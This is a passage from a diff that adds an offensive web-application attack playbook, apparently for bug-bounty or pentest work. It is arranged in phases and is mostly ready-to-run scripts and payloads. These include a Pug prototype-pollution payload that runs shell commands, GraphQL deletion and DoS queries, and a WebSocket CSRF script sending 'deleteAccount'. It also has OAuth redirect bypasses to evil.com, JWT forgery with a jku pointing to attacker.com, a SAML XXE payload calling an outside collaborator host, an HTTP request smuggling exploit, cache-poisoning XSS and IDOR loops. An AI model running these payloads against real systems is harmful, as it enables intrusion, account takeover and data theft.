+  | grep "r\.\|Param\|Form\|Query\|Var\|FormValue" | tee audit_go_traversal.txt
+grep -rn "http\.Get\s*(\|http\.Post\s*(\|http\.NewRequest\|client\.Do\s*(" --include="*.go" ./ \
+  | grep "r\.\|Param\|Form\|Query\|FormValue" | tee audit_go_ssrf.txt
+grep -rn "template\.HTML\s*(\|template\.JS\s*(\|template\.URL\s*(\|tmpl\.Execute\s*(" \
+  --include="*.go" ./ | grep "r\.\|Param\|Form\|Query" | tee audit_go_ssti.txt
+```
+
+### .NET / C#
+
+```bash
+grep -rn "SqlCommand\|OleDbCommand\|ExecuteQuery\|ExecuteReader\|FromSqlRaw\|FromSql\b" \
+  --include="*.cs" ./ | grep 'Request\.\|"\s*+\|string\.Format' | tee audit_cs_sqli.txt
+grep -rn "Process\.Start\|UseShellExecute\s*=\s*true\|Assembly\.Load\|Assembly\.LoadFrom\|Activator\.CreateInstance" \
+  --include="*.cs" ./ | tee audit_cs_rce.txt
+grep -rn "BinaryFormatter\|XmlSerializer\|DataContractSerializer\|NetDataContractSerializer\|JsonConvert\.DeserializeObject\|TypeNameHandling" \
+  --include="*.cs" ./ | tee audit_cs_deserial.txt
+grep -rn "TypeNameHandling\s*=\s*TypeNameHandling\." --include="*.cs" ./ \
+  | grep -v "TypeNameHandling\.None" | tee -a audit_cs_deserial.txt
+grep -rn "WebClient\s*(\|HttpClient\s*(\|WebRequest\.Create\|new Uri\s*(\|HttpWebRequest" \
+  --include="*.cs" ./ | grep "Request\.\|Param\|Form\[" | tee audit_cs_ssrf.txt
+grep -rn "@Html\.Raw\s*(\|IHtmlString\|HtmlString\s*(\|MarkupString" \
+  --include="*.cs" --include="*.cshtml" ./ | grep "Request\.\|Param\|Form\[" | tee audit_cs_xss.txt
+grep -rn "EnableViewStateMac\s*=\s*false\|ViewStateEncryptionMode\s*=\s*Never" \
+  --include="*.cs" --include="*.aspx" --include="*.config" ./ | tee audit_cs_viewstate.txt
+```
+
+## PHASE 2 — PROTOTYPE POLLUTION
+
+### Client-Side Detection
+
+```bash
+# Grep for merge/assign sinks in JS
+grep -rn "Object\.assign\|_.merge\|_.extend\|\.merge\s*(\|\.extend\s*(\|deepMerge\|mergeDeep" \
+  --include="*.js" ./ | tee proto_sinks.txt
+
+# Test via URL parameters
+# ?__proto__[testprop]=polluted
+# ?constructor[prototype][testprop]=polluted
+# ?__proto__.testprop=polluted
+
+# Test via JSON body
+curl -s -X POST $TARGET_URL/api/settings \
   -H "Content-Type: application/json" \
-  -H "Cookie: session=VALID_SESSION" \
-  -d '{"key":"FUZZ","other":"value"}' \
-  -w /home/fox/SecLists/Fuzzing/special-chars.txt \
-  -mc all -fc 200 \
-  -o recon/vulns/fuzz-json.json -of json
+  -d '{"__proto__":{"testprop":"polluted123"}}' | tee proto_test1.txt
 
-# Path traversal fuzzing
-ffuf -u "https://target.com/api/files/FUZZ" \
-  -w /home/fox/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt \
-  -mc 200 \
-  -o recon/vulns/fuzz-lfi.json -of json
+curl -s -X POST $TARGET_URL/api/settings \
+  -H "Content-Type: application/json" \
+  -d '{"constructor":{"prototype":{"testprop":"polluted123"}}}' | tee proto_test2.txt
 
-# HTTP verb fuzzing
-for method in GET POST PUT DELETE PATCH OPTIONS HEAD TRACE CONNECT; do
-  code=$(curl -so /dev/null -w "%{http_code}" -X $method https://target.com/api/admin/)
-  echo "$method -> $code"
+# Check if poll was successful
+curl -s $TARGET_URL/api/settings | grep "polluted123" && echo "[+] PROTOTYPE POLLUTED!"
+
+# Client-side XSS gadgets
+grep -rn "innerHTML\|outerHTML\|document\.write\|eval\s*(\|setTimeout\s*(\|setInterval\s*(" \
+  --include="*.js" ./ | tee proto_xss_gadgets.txt
+```
+
+### Server-Side Prototype Pollution (Node.js)
+
+```bash
+# Pug template engine RCE via SSPP
+curl -s -X POST $TARGET_URL/api/update \
+  -H "Content-Type: application/json" \
+  -d '{"__proto__":{"outputFunctionName":"_tmp1;global.process.mainModule.require(\"child_process\").execSync(\"id > /tmp/pwned\");var __tmp2"}}' \
+  | tee sspp_pug_rce.txt
+
+# Privilege escalation via property injection
+curl -s -X POST $TARGET_URL/api/profile \
+  -H "Content-Type: application/json" \
+  -d '{"__proto__":{"isAdmin":true,"role":"admin","admin":true}}' | tee sspp_privesc.txt
+
+curl -s -X POST $TARGET_URL/api/user \
+  -H "Content-Type: application/json" \
+  -d '{"constructor":{"prototype":{"isAdmin":true}}}' | tee sspp_constructor.txt
+
+# Status check after pollution
+curl -s -H "Authorization: Bearer TOKEN" $TARGET_URL/api/admin | tee sspp_check.txt
+
+# Find server-side merge sinks
+grep -rn "_.merge\|lodash.*merge\|deepmerge\|merge(\s*{}\|merge(\s*req\." --include="*.js" ./ | tee sspp_sinks.txt
+```
+
+## PHASE 3 — GRAPHQL ATTACKS
+
+```bash
+GRAPHQL_URL="https://target.com/graphql"
+
+# Introspection
+curl -s -X POST $GRAPHQL_URL \
+  -H "Content-Type: application/json" \
+  -d '{"query":"{ __schema { types { name } } }"}' | jq . | tee gql_introspect.txt
+
+# Full schema dump
+curl -s -X POST $GRAPHQL_URL \
+  -H "Content-Type: application/json" \
+  -d '{"query":"query IntrospectionQuery { __schema { queryType { name } mutationType { name } types { kind name fields(includeDeprecated:true) { name args { name type { kind name } } type { kind name } } inputFields { name type { kind name } } } } }"}' \
+  | jq . | tee gql_schema.txt
+
+# Field suggestion attack (introspection disabled)
+curl -s -X POST $GRAPHQL_URL -H "Content-Type: application/json" \
+  -d '{"query":"{ usr { id } }"}' | tee gql_field_suggest.txt
+
+# Batching attack
+curl -s -X POST $GRAPHQL_URL -H "Content-Type: application/json" \
+  -d '[{"query":"{ user(id:1){email}"},{"query":"{ user(id:2){email}"},{"query":"{ user(id:3){email}}"}]' \
+  | jq . | tee gql_batching.txt
+
+# Alias attack — bypass rate limits, mass enum
+ALIAS_QUERY='{"query":"{ '
+for i in $(seq 1 20); do
+  ALIAS_QUERY+="u$i: user(id:$i){id email role} "
+done
+ALIAS_QUERY+='}"}'
+curl -s -X POST $GRAPHQL_URL -H "Content-Type: application/json" -d "$ALIAS_QUERY" | jq . | tee gql_alias.txt
+
+# Deep recursion DoS
+curl -s -X POST $GRAPHQL_URL -H "Content-Type: application/json" \
+  -d '{"query":"{ user { friends { friends { friends { friends { friends { id } } } } } } }"}' | tee gql_recursion.txt
+
+# Unauthenticated mutations
+curl -s -X POST $GRAPHQL_URL -H "Content-Type: application/json" \
+  -d '{"query":"mutation { deleteUser(id:1) { success } }"}' | tee gql_unauth_delete.txt
+curl -s -X POST $GRAPHQL_URL -H "Content-Type: application/json" \
+  -d '{"query":"mutation { updateRole(userId:1,role:\"admin\") { success } }"}' | tee gql_privesc.txt
+
+# IDOR via GraphQL
+for id in $(seq 1 20); do
+  curl -s -X POST $GRAPHQL_URL -H "Content-Type: application/json" \
+    -d "{\"query\":\"{ user(id:$id) { id email role } }\"}" | jq -c '{id:.data.user.id,email:.data.user.email}' >> gql_idor.txt
+done
+
+# GraphQL over GET (CSRF bypass)
+curl -sG "$GRAPHQL_URL" --data-urlencode 'query={ users { id email } }' | tee gql_get.txt
+
+# Injection in GraphQL args
+curl -s -X POST $GRAPHQL_URL -H "Content-Type: application/json" \
+  -d '{"query":"{ users(filter:\"1=1 OR 1=1\") { id email } }"}' | tee gql_injection.txt
+```
+
+## PHASE 4 — WEBSOCKET SECURITY
+
+```python
+# websocket_test.py — run with: python3 websocket_test.py
+import websocket, json, ssl, sys
+
+TARGET_WS = "wss://target.com/ws"
+VALID_TOKEN = "YOUR_SESSION_TOKEN"
+
+results = []
+
+def on_message(ws, msg):
+    print(f"[RECV] {msg}")
+    results.append(msg)
+
+def on_error(ws, err):
+    print(f"[ERR] {err}")
+
+def on_close(ws, code, msg):
+    print(f"[CLOSE] {code} {msg}")
+
+# Test 1: Unauthenticated connection
+def test_unauth():
+    try:
+        ws = websocket.create_connection(TARGET_WS, sslopt={"cert_reqs": ssl.CERT_NONE})
+        print("[+] Unauthenticated connection accepted!")
+        ws.send(json.dumps({"type": "getUsers"}))
+        print(f"Response: {ws.recv()}")
+        ws.close()
+    except Exception as e:
+        print(f"[-] Unauth blocked: {e}")
+
+# Test 2: Cross-origin CSRF
+def test_csrf():
+    try:
+        ws = websocket.create_connection(TARGET_WS,
+            header={"Origin": "https://evil.com", "Cookie": f"session={VALID_TOKEN}"},
+            sslopt={"cert_reqs": ssl.CERT_NONE})
+        print("[+] Cross-origin accepted! CSRF via WebSocket possible")
+        ws.send(json.dumps({"action": "deleteAccount", "confirm": True}))
+        print(f"Response: {ws.recv()}")
+        ws.close()
+    except Exception as e:
+        print(f"[-] Cross-origin blocked: {e}")
+
+# Test 3: XSS via WebSocket message
+def test_xss():
+    try:
+        ws = websocket.create_connection(TARGET_WS,
+            header={"Cookie": f"session={VALID_TOKEN}"},
+            sslopt={"cert_reqs": ssl.CERT_NONE})
+        ws.send(json.dumps({"type": "message", "content": "<script>alert(document.domain)</script>"}))
+        resp = ws.recv()
+        if "<script>" in resp:
+            print(f"[+] XSS reflected in WS response!")
+        ws.close()
+    except Exception as e:
+        print(f"Error: {e}")
+
+# Test 4: Auth bypass via message type manipulation
+def test_auth_bypass():
+    try:
+        ws = websocket.create_connection(TARGET_WS, sslopt={"cert_reqs": ssl.CERT_NONE})
+        # Try to send admin actions without auth
+        for action in ["getAdminData", "listUsers", "getSecretKey", "dumpDatabase"]:
+            ws.send(json.dumps({"type": action, "auth": None}))
+            try:
+                resp = ws.recv()
+                print(f"{action}: {resp[:200]}")
+            except:
+                pass
+        ws.close()
+    except Exception as e:
+        print(f"Error: {e}")
+
+test_unauth()
+test_csrf()
+test_xss()
+test_auth_bypass()
+```
+
+## PHASE 5 — OAUTH / OIDC ATTACKS
+
+```bash
+TARGET_URL="https://target.com"
+OAUTH_SERVER="https://auth.target.com"
+CLIENT_ID="discovered_from_js"
+
+# Discover endpoints
+curl -s "$TARGET_URL/.well-known/openid-configuration" | jq . | tee oauth_config.txt
+AUTHZ_URL=$(jq -r '.authorization_endpoint' oauth_config.txt 2>/dev/null)
+TOKEN_URL=$(jq -r '.token_endpoint' oauth_config.txt 2>/dev/null)
+
+# 1. CSRF — missing state parameter
+curl -sI "${AUTHZ_URL}?response_type=code&client_id=${CLIENT_ID}&redirect_uri=${TARGET_URL}/callback&scope=openid" \
+  | grep -i "location\|state" | tee oauth_csrf.txt
+
+# 2. redirect_uri bypass
+for uri in \
+  "${TARGET_URL}.evil.com/callback" \
+  "${TARGET_URL}/callback/../../../evil" \
+  "${TARGET_URL}/callbackXevil.com" \
+  "https://evil.com" \
+  "${TARGET_URL}/callback%40evil.com" \
+  "https://evil.com%23${TARGET_URL}/callback" \
+  "https://evil.com%2F@${TARGET_URL}/callback" \
+  "${TARGET_URL}/callback?redirect=https://evil.com" \
+  "javascript:alert(1)"; do
+  ENC=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$uri'))")
+  CODE=$(curl -sI "${AUTHZ_URL}?response_type=code&client_id=${CLIENT_ID}&redirect_uri=${ENC}&scope=openid" \
+    -o /dev/null -w "%{http_code}")
+  LOC=$(curl -sI "${AUTHZ_URL}?response_type=code&client_id=${CLIENT_ID}&redirect_uri=${ENC}&scope=openid" \
+    | grep -i "location" | head -1)
+  echo "$CODE $uri -> $LOC" | tee -a oauth_redirect_bypass.txt
+done
+
+# 3. Implicit flow token in URL fragment
+curl -sI "${AUTHZ_URL}?response_type=token&client_id=${CLIENT_ID}&redirect_uri=${TARGET_URL}/callback&scope=openid" \
+  | grep -i "location\|access_token" | tee oauth_implicit.txt
+
+# 4. PKCE bypass
+curl -s -X POST $TOKEN_URL \
+  -d "grant_type=authorization_code&code=STOLEN_CODE&client_id=$CLIENT_ID&redirect_uri=${TARGET_URL}/callback" \
+  | jq . | tee oauth_pkce_bypass.txt
+
+# 5. State parameter entropy check
+for i in $(seq 1 5); do
+  STATE=$(curl -sI "${AUTHZ_URL}?response_type=code&client_id=$CLIENT_ID&scope=openid" \
+    | grep -i "location" | grep -oP "state=[^&]+" | head -1)
+  echo "state$i: $STATE" | tee -a oauth_state_entropy.txt
+done
+
+# 6. Account takeover via unverified email in JWT claim
+curl -s $TOKEN_URL \
+  -d "grant_type=authorization_code&code=VALID_CODE&client_id=$CLIENT_ID" \
+  | python3 -c "
+import json,sys,base64
+d=json.load(sys.stdin)
+id_token = d.get('id_token','')
+if id_token:
+    parts = id_token.split('.')
+    payload = json.loads(base64.b64decode(parts[1]+'=='))
+    print(json.dumps(payload, indent=2))
+" | tee oauth_id_token.txt
+```
+
+## PHASE 6 — JWT ATTACKS
+
+```python
+# jwt_attacks.py
+import base64, json, hmac, hashlib
+
+def b64url_encode(data):
+    if isinstance(data, str): data = data.encode()
+    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()
+
+def b64url_decode(s):
+    return base64.b64decode(s + '==')
+
+TARGET_JWT = "YOUR_JWT_HERE"  # replace with captured JWT
+parts = TARGET_JWT.split('.')
+header = json.loads(b64url_decode(parts[0]))
+payload = json.loads(b64url_decode(parts[1]))
+print(f"Header: {header}")
+print(f"Payload: {payload}")
+
+# Attack 1: none algorithm
+payload_admin = payload.copy()
+payload_admin['role'] = 'admin'
+payload_admin['sub'] = 'admin'
+
+for alg_none in ['none', 'None', 'NONE', 'nOnE', 'NoNe']:
+    h = {'alg': alg_none, 'typ': 'JWT'}
+    enc_h = b64url_encode(json.dumps(h, separators=(',', ':')))
+    enc_p = b64url_encode(json.dumps(payload_admin, separators=(',', ':')))
+    print(f"\nnone ({alg_none}): {enc_h}.{enc_p}.")
+
+# Attack 2: weak secret brute force (offline)
+# hashcat -a 0 -m 16500 TOKEN rockyou.txt
+# john --format=HMAC-SHA256 --wordlist=rockyou.txt jwt.txt
+
+# Attack 3: kid path traversal (sign with empty key)
+h_kid = {'alg': 'HS256', 'kid': '../../dev/null', 'typ': 'JWT'}
+enc_h_kid = b64url_encode(json.dumps(h_kid, separators=(',', ':')))
+enc_p_admin = b64url_encode(json.dumps(payload_admin, separators=(',', ':')))
+signing_input = f"{enc_h_kid}.{enc_p_admin}"
+sig = hmac.new(b"", signing_input.encode(), hashlib.sha256).digest()
+enc_sig = base64.urlsafe_b64encode(sig).rstrip(b'=').decode()
+print(f"\nkid=../../dev/null: {enc_h_kid}.{enc_p_admin}.{enc_sig}")
+
+# Attack 4: kid SQL injection
+for kid_payload in [
+    "' UNION SELECT 'hacked_secret' -- ",
+    "1' UNION SELECT 'hacked_secret'#",
+    "../../etc/passwd",
+]:
+    h_sqli = {'alg': 'HS256', 'kid': kid_payload, 'typ': 'JWT'}
+    enc_h2 = b64url_encode(json.dumps(h_sqli, separators=(',', ':')))
+    for secret in ['hacked_secret', '', 'null', 'secret', 'password']:
+        signing_input2 = f"{enc_h2}.{enc_p_admin}"
+        sig2 = hmac.new(secret.encode(), signing_input2.encode(), hashlib.sha256).digest()
+        enc_sig2 = base64.urlsafe_b64encode(sig2).rstrip(b'=').decode()
+        print(f"\nkid SQLi ({kid_payload[:30]}..., secret={secret}):\n{enc_h2}.{enc_p_admin}.{enc_sig2}")
+```
+
+```bash
+# RS256→HS256 confusion (requires public key)
+# Fetch public key from JWKS
+curl -s "$TARGET_URL/.well-known/jwks.json" | jq . | tee jwks.json
+curl -s "$TARGET_URL/.well-known/openid-configuration" | jq -r '.jwks_uri' | xargs curl -s | jq . > jwks.json
+
+# Use jwt_tool for RS256->HS256 confusion
+python3 jwt_tool.py TARGET_JWT -X k -pk public_key.pem 2>/dev/null
+
+# jku header injection (point to attacker-controlled JWKS)
+python3 jwt_tool.py TARGET_JWT -X j -ju "https://attacker.com/jwks.json" 2>/dev/null
+
+# x5u header injection
+python3 jwt_tool.py TARGET_JWT -X x -xu "https://attacker.com/cert.crt" 2>/dev/null
+
+# Brute force JWT secret
+hashcat -a 0 -m 16500 "$JWT" /usr/share/wordlists/rockyou.txt 2>/dev/null
+python3 jwt_tool.py "$JWT" -C -d /usr/share/wordlists/rockyou.txt 2>/dev/null
+```
+
+## PHASE 7 — SAML ATTACKS
+
+```bash
+TARGET_URL="https://target.com"
+SAML_ACS="$TARGET_URL/saml/acs"
+
+# Decode SAML response
+SAML_B64="PASTE_BASE64_HERE"
+echo "$SAML_B64" | base64 -d | xmllint --format - 2>/dev/null | tee saml_decoded.xml
+
+# Attack 1: XML comment injection in NameID
+python3 << 'PYEOF'
+import base64
+
+# admin@target.com<!-- --> attacker@evil.com
+# Parsed as admin@target.com by some validators
+evil_nameid = "admin@target.com<!-- evil -->"
+
+saml_xml = f"""<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="_test" Version="2.0" IssueInstant="2020-01-01T00:00:00Z">
+  <saml:Assertion ID="_assertion" Version="2.0" IssueInstant="2020-01-01T00:00:00Z">
+    <saml:Issuer>https://idp.target.com</saml:Issuer>
+    <saml:Subject>
+      <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">{evil_nameid}</saml:NameID>
+    </saml:Subject>
+    <saml:Conditions NotBefore="2000-01-01T00:00:00Z" NotOnOrAfter="2100-01-01T00:00:00Z"/>
+    <saml:AuthnStatement AuthnInstant="2020-01-01T00:00:00Z">
+      <saml:AuthnContext><saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</saml:AuthnContextClassRef></saml:AuthnContext>
+    </saml:AuthnStatement>
+  </saml:Assertion>
+</samlp:Response>"""
+
+encoded = base64.b64encode(saml_xml.encode()).decode()
+print(f"SAMLResponse={encoded}")
+PYEOF
+
+# Attack 2: XXE in SAML
+python3 << 'PYEOF'
+import base64
+
+collab = "BURP_COLLABORATOR_HERE"
+xxe_saml = f"""<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY % xxe SYSTEM "http://{collab}/saml_xxe">
+  %xxe;
+]>
+<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
+  <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
+    <saml:Subject>
+      <saml:NameID>&xxe;</saml:NameID>
+    </saml:Subject>
+  </saml:Assertion>
+</samlp:Response>"""
+
+print(f"SAMLResponse={base64.b64encode(xxe_saml.encode()).decode()}")
+PYEOF
+
+# Attack 3: Signature wrapping — use saml-raider Burp extension or samlattacker
+# Manual XSW: clone assertion, move signature to cover only original clone
+echo "Use Burp SAML Raider extension for XSW attacks"
+echo "Or: python3 samlattacker.py --response saml_decoded.xml --attack xsw1"
+```
+
+## PHASE 8 — HTTP REQUEST SMUGGLING
+
+```python
+# smuggle.py — CL.TE and TE.CL detection and exploitation
+import socket, ssl, time, sys
+
+def raw_request(host, port, data, timeout=10):
+    ctx = ssl.create_default_context()
+    ctx.check_hostname = False
+    ctx.verify_mode = ssl.CERT_NONE
+    with socket.create_connection((host, port), timeout=timeout) as s:
+        if port == 443:
+            s = ctx.wrap_socket(s, server_hostname=host)
+        s.sendall(data)
+        time.sleep(2)
+        response = b""
+        try:
+            while True:
+                chunk = s.recv(4096)
+                if not chunk: break
+                response += chunk
+        except:
+            pass
+        return response.decode(errors='replace')
+
+HOST = "target.com"
+PORT = 443
+
+# CL.TE detection (timing)
+cl_te_detect = (
+    b"POST / HTTP/1.1\r\n"
+    b"Host: " + HOST.encode() + b"\r\n"
+    b"Content-Type: application/x-www-form-urlencoded\r\n"
+    b"Content-Length: 4\r\n"
+    b"Transfer-Encoding: chunked\r\n"
+    b"Connection: keep-alive\r\n"
+    b"\r\n"
+    b"1\r\n"
+    b"A\r\n"
+)
+start = time.time()
+print("Testing CL.TE...")
+try:
+    r = raw_request(HOST, PORT, cl_te_detect, timeout=12)
+    elapsed = time.time() - start
+    print(f"Response in {elapsed:.2f}s")
+    if elapsed > 8:
+        print("[+] LIKELY CL.TE VULNERABLE — backend timed out!")
+    else:
+        print(f"Response: {r[:200]}")
+except socket.timeout:
+    print(f"[+] TIMEOUT — CL.TE CONFIRMED!")
+
+# CL.TE exploitation — smuggle GET /admin
+cl_te_exploit = (
+    b"POST / HTTP/1.1\r\n"
+    b"Host: " + HOST.encode() + b"\r\n"
+    b"Content-Type: application/x-www-form-urlencoded\r\n"
+    b"Content-Length: 37\r\n"
+    b"Transfer-Encoding: chunked\r\n"
+    b"Connection: keep-alive\r\n"
+    b"\r\n"
+    b"0\r\n"
+    b"\r\n"
+    b"GET /admin HTTP/1.1\r\n"
+    b"X-Ignore: x"
+)
+print("\nSending CL.TE exploit...")
+print(raw_request(HOST, PORT, cl_te_exploit)[:500])
+
+# TE.CL detection
+body = b"GPOST / HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 5\r\n\r\nx=1\r\n"
+chunk_size = hex(len(body))[2:].encode()
+te_cl_detect = (
+    b"POST / HTTP/1.1\r\n"
+    b"Host: " + HOST.encode() + b"\r\n"
+    b"Content-Length: 4\r\n"
+    b"Transfer-Encoding: chunked\r\n"
+    b"Connection: keep-alive\r\n"
+    b"\r\n" +
+    chunk_size + b"\r\n" +
+    body +
+    b"0\r\n\r\n"
+)
+print("\nTesting TE.CL...")
+r2 = raw_request(HOST, PORT, te_cl_detect)
+print(r2[:500])
+
+# TE.TE obfuscation variants to try
+te_variants = [
+    b"Transfer-Encoding: xchunked",
+    b"Transfer-Encoding : chunked",
+    b"Transfer-Encoding: chunked\r\nTransfer-Encoding: identity",
+    b"Transfer-Encoding:\x0bchunked",
+    b"Transfer-Encoding: x",
+    b"Transfer-Encoding:[tab]chunked",
+    b"X: X[\n]Transfer-Encoding: chunked",
+    b"Transfer-Encoding: chunked1",
+]
+print("\nTE.TE obfuscation tests:")
+for te in te_variants:
+    print(f"  {te.decode(errors='replace')}")
+```
+
+## PHASE 9 — CACHE POISONING
+
+```bash
+TARGET_URL="https://target.com"
+
+# Detect caching
+curl -sI $TARGET_URL | grep -i "x-cache\|cf-cache\|age\|cache-control\|etag\|vary" | tee cache_headers.txt
+
+# Unkeyed header reflection
+for header in "X-Forwarded-Host" "X-Forwarded-Scheme" "X-Forwarded-Proto" \
+  "X-Host" "X-Rewrite-URL" "X-Original-URL" "X-HTTP-Method-Override" \
+  "Forwarded" "X-Forwarded-Server" "X-Forwarded-Port" "X-Original-Host" \
+  "X-Forwarded-For-Original" "X-Custom-IP-Authorization"; do
+  RESP=$(curl -s -H "$header: evil.com" $TARGET_URL)
+  if echo "$RESP" | grep -qi "evil.com"; then
+    echo "[+] REFLECTED: $header" | tee -a cache_poison_candidates.txt
+  fi
+done
+
+# Web Cache Deception
+for ext in .css .js .png .ico .gif .jpg .woff2 .svg .json .txt; do
+  STATUS=$(curl -sI "${TARGET_URL}/account${ext}" -o /dev/null -w "%{http_code}")
+  CACHE=$(curl -sI "${TARGET_URL}/account${ext}" | grep -i "x-cache\|age" | head -1)
+  echo "$STATUS $ext | $CACHE" | tee -a cache_deception.txt
+done
+
+# Cache poisoning XSS via X-Forwarded-Host
+curl -s -H "X-Forwarded-Host: evil.com" $TARGET_URL | grep "evil.com" && {
+  echo "[+] XFH reflected — poisoning cache"
+  # Send with XSS payload
+  curl -s -H 'X-Forwarded-Host: evil.com"><script>alert(document.domain)</script>' $TARGET_URL \
+    | tee cache_xss_poison.txt
+  # Verify cache served the poisoned version
+  sleep 2
+  curl -s $TARGET_URL | grep "evil.com" && echo "[CRITICAL] Cache poisoned with XSS!"
+}
+
+# Fat GET attack
+curl -sI -X GET $TARGET_URL \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  --data "x=injected_value" | tee cache_fat_get.txt
+
+# Unkeyed query parameter
+curl -s "${TARGET_URL}?ignored_param=evil_value" | grep "evil_value" && \
+  echo "[+] Unkeyed query param reflected — cache poisoning via QS"
+```
+
+## PHASE 10 — BUSINESS LOGIC FLAWS
+
+```
+PRICE/PAYMENT (test these):
+  1.  Negative quantity: {"quantity": -1} in cart API
+  2.  Zero price: modify price param to 0 after add-to-cart
+  3.  Integer overflow: {"quantity": 9999999999} -> wraps negative
+  4.  Coupon race: 20 parallel POST /cart/coupon with same code
+  5.  Coupon different cart: validate on cart A, apply to cart B
+  6.  Skip payment: POST /order/confirm directly after cart creation
+  7.  Replay payment token: reuse old successful payment token
+  8.  Currency manipulation: change "currency":"USD" to "currency":"VND" after price calc
+  9.  Retroactive discount: IDOR on order ID to apply code after purchase
+  10. Negative order total → store credit
+
+AUTHENTICATION:
+  11. Password reset token reuse (no invalidation after use)
+  12. Password reset token brute force (check token length and charset)
+  13. Change email → skip re-verification → steal another account
+  14. Change password without current password check
+  15. Session not invalidated on logout (test by using old session token)
+  16. Session not invalidated on password change
+  17. MFA step 2 direct access: GET /mfa/verify without completing step 1
+  18. MFA token reuse across accounts
+  19. Case-insensitive email bypass: ADMIN@SITE.COM == admin@site.com
+  20. Infinite login attempts (missing lockout)
+
+AUTHORIZATION:
+  21. IDOR: change user ID in URL/body to another user's ID
+  22. Mass assignment: include role/isAdmin in registration POST body
+  23. Function-level: API endpoint /api/admin/* accessible to regular user
+  24. JWT role claim manipulation (see Phase 6)
+  25. Access soft-deleted resources via direct ID reference
+  26. Draft/unpublished content via direct URL
+
+WORKFLOW:
+  27. Skip intermediate checkout steps via direct API call
+  28. Apply referral code to own account
+  29. Transfer more than balance via race condition
+  30. Order without stock check (concurrent requests)
+  31. Double submit: two simultaneous POST /order/complete
+
+VALIDATION:
+  32. Unicode normalization: ℳ (U+2133) for m, ＠ (U+FF20) for @
+  33. Null bytes in input: user%00@evil.com matches user@evil.com
+  34. CSV injection in exports: =cmd|' /C calc'!A0
+  35. Extra-long inputs trigger truncation → collisions
+```
+
+## PHASE 11 — RACE CONDITIONS
+
+```python
+# race.py — parallel request race condition testing
+import threading, requests, time, sys
+
+TARGET = "https://target.com/api/promo/apply"
+HEADERS = {"Content-Type": "application/json", "Cookie": "session=VALID_SESSION"}
+PAYLOAD = {"promo_code": "SAVE100", "order_id": "ORD-12345"}
+N = 25
+
+results = []
+barrier = threading.Barrier(N)
+
+def race_req():
+    barrier.wait()  # all threads start simultaneously
+    try:
+        r = requests.post(TARGET, json=PAYLOAD, headers=HEADERS, timeout=10)
+        results.append((r.status_code, r.text[:150]))
+    except Exception as e:
+        results.append((0, str(e)))
+
+print(f"Launching {N} simultaneous requests...")
+threads = [threading.Thread(target=race_req) for _ in range(N)]
+for t in threads: t.start()
+for t in threads: t.join()
+
+print("\nResults:")
+from collections import Counter
+status_counts = Counter(r[0] for r in results)
+print(f"Status distribution: {dict(status_counts)}")
+
+successes = [r for r in results if r[0] == 200 and "success" in r[1].lower()]
+print(f"\n[{'RACE WIN!' if len(successes) > 1 else 'failed'}] {len(successes)}/{N} succeeded")
+for r in successes:
+    print(f"  {r[1][:100]}")
+```
+
+```
+# Turbo Intruder script (Burp extension) — single-packet attack
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=1,
+                           requestsPerConnection=30,
+                           pipeline=False)
+    for i in range(30):
+        engine.queue(target.req, None, gate='race1')
+    engine.openGate('race1')
+
+def handleResponse(req, interesting):
+    table.add(req)
+```
+
+## PHASE 12 — MASS ASSIGNMENT
+
+```bash
+TARGET_URL="https://target.com"
+AUTH="Authorization: Bearer VALID_TOKEN"
+
+# Probe registration with privileged fields
+curl -s -X POST "$TARGET_URL/api/register" \
+  -H "Content-Type: application/json" \
+  -d '{"email":"test@evil.com","password":"Passw0rd!","role":"admin","isAdmin":true,"verified":true,"balance":99999}' \
+  | jq . | tee mass_assign_register.txt
+
+# Probe profile update
+for field in '{"role":"admin"}' '{"isAdmin":true}' '{"admin":true}' \
+  '{"is_admin":true}' '{"is_staff":true}' '{"permissions":["admin"]}' \
+  '{"plan":"enterprise"}' '{"subscriptionTier":"premium"}' \
+  '{"verified":true}' '{"emailVerified":true}' '{"balance":99999}' \
+  '{"accountType":"admin"}' '{"userType":"admin"}' '{"access_level":9}'; do
+  RESP=$(curl -s -X PUT "$TARGET_URL/api/user/me" \
+    -H "Content-Type: application/json" -H "$AUTH" -d "$field")
+  echo "$field -> $RESP" | tee -a mass_assign_results.txt
+done
+
+# Check result
+curl -s -H "$AUTH" "$TARGET_URL/api/user/me" | jq . | tee mass_assign_check.txt
+```
+
+## PHASE 13 — IDOR
+
+```bash
+TARGET_URL="https://target.com"
+AUTH="Authorization: Bearer USER_A_TOKEN"
+VICTIM_ID="2"
+
+# Object-level IDOR
+for path in "/api/user/$VICTIM_ID" "/api/user/$VICTIM_ID/profile" \
+  "/api/orders/$VICTIM_ID" "/api/invoices/$VICTIM_ID" \
+  "/api/files/$VICTIM_ID" "/api/messages/$VICTIM_ID" \
+  "/api/transactions/$VICTIM_ID" "/api/accounts/$VICTIM_ID"; do
+  STATUS=$(curl -sI -H "$AUTH" "${TARGET_URL}${path}" -o /dev/null -w "%{http_code}")
+  [ "$STATUS" = "200" ] && echo "[IDOR!] $path" | tee -a idor_results.txt
+done
+
+# File download IDOR
+for fid in $(seq 1 50); do
+  STATUS=$(curl -sI -H "$AUTH" "${TARGET_URL}/api/files/$fid/download" -o /dev/null -w "%{http_code}")
+  [ "$STATUS" = "200" ] && echo "[IDOR] File $fid" | tee -a idor_files.txt
+done
+
+# HTTP method bypass
+for method in GET POST PUT PATCH DELETE HEAD; do
+  STATUS=$(curl -sI -X $method -H "$AUTH" "${TARGET_URL}/api/user/$VICTIM_ID" -o /dev/null -w "%{http_code}")
+  echo "$method -> $STATUS" | tee -a idor_methods.txt
+done
+
+# Automated with ffuf
+ffuf -u "${TARGET_URL}/api/user/FUZZ/profile" \
+  -w <(seq 1 200) \
